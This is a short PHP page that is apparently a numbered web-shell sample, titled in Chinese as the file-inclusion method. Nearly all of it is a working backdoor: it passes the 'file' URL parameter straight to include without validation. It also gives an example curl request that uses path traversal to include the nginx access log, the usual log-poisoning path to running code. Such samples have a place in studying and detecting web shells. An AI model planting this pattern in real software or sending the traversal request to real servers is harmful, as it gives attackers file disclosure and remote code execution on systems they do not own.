<html>
<head>
	<meta charset="UTF-8"/>
	<title>016 - WebShell - 文件包含方式</title>

</head>

<body>
	<h1>016 - WebShell - 文件包含方式</h1>

	<p>不正常调用</p>
	<pre>curl <?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?file=../../../../../../../../../../../../../var/log/nginx/access.log'?></pre>

	<br>
	<p>包含内容</p>
<?php 
	if (isset ($_GET['file']))
	{
		include $_GET['file'];
	}
?>
</body>
</html>
